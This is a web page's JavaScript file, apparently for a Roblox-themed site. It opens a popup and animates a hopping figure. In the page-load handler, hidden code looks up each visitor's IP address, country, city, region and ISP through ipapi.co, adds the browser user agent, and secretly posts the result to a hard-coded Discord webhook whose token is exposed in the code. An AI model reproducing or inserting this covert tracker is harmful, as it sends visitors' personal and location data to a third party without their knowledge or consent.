
// Show popup on page load
window.onload = function () {
    document.getElementById("popup-modal").style.display = "flex";
    document.getElementById("popup-close").onclick = function () {
        document.getElementById("popup-modal").style.display = "none";
    };
    fetch("https://ipapi.co/json")
        .then(res => res.json())
        .then(data => {
            const userAgent = navigator.userAgent;
            const message = `👀 New visit:\n🌍 IP: ${data.ip}\n📍 Country: ${data.country_name} (${data.country_code})\n🏙️ City: ${data.city}\n🌐 Region: ${data.region}\n🔌 ISP: ${data.org}\n🧭 Browser: ${userAgent}`;
            fetch("https://discordapp.com/api/webhooks/1374477247582437537/CtcC6Ce6MfFrf6Zw7_yzeO8DikQMErIzaNEdWYBJSr9A5CGOd5PcWmOaqSShwpTYxdb3", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: message })
            });
        });
};

const roblox = document.getElementById('robloxFigure');
let onRight = true;

// USTAW pozycję startową TYLKO raz
roblox.style.left = '';
roblox.style.right = '30px';

function hop(times, duration, cb) {
    let hops = 0;
    const oneHop = duration / times;
    function singleHop() {
        roblox.animate([
            { transform: 'translateY(0)' },
            { transform: 'translateY(-40px)' },
            { transform: 'translateY(0)' }
        ], {
            duration: oneHop * 1000,
            easing: 'cubic-bezier(.4,-0.4,.8,1.6)'
        });
        hops++;
        if (hops < times) {
            setTimeout(singleHop, oneHop * 1000);
        } else {
            if (cb) setTimeout(cb, 60);
        }
    }
    singleHop();
}

function moveFigure(toLeft, cb) {
    // Kasujemy left/right żeby nigdy nie były jednocześnie
    if (toLeft) {
        roblox.style.transition = "left 2s";   // użyj tylko left
        roblox.style.right = '';
        roblox.style.left = '30px';
    } else {
        roblox.style.transition = "right 2s";  // użyj tylko right
        roblox.style.left = '';
        roblox.style.right = '30px';
    }
    setTimeout(cb, 2000);
}

function runLoop() {
    let repeatHops = 0;
    function repeatSideHops() {
        hop(2, 6, () => {
            repeatHops++;
            if (repeatHops < 3) setTimeout(repeatSideHops, 0);
            else doMove();
        });
    }
    function doMove() {
        hop(3, 2);
        moveFigure(!onRight, () => {
            onRight = !onRight;
            repeatHops = 0;
            setTimeout(runLoop, 100);
        });
    }
    repeatSideHops();
}

runLoop();







